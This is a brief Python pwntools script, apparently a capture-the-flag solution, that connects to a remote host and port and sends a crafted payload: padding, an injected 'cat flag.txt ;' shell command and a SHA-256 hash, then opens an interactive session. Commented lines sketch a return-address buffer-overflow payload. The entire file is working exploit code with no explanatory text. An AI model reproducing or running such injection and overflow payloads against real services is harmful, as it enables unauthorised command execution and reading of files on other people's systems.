from pwn import *
import  hashlib
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

# level5 = ELF('./level5')
sh = remote('111.200.241.244','53569')
payload = 'a' * 0x100
payload +='cat flag.txt ;'.ljust(0x1b,' ') + hashlib.sha256('a' * 0x100).hexdigest()
# ret = 0x0000000000400596
# payload = 'a'*0x80 + 'b' * 0x8 + p64(ret)
sh.sendline(payload)
sh.interactive()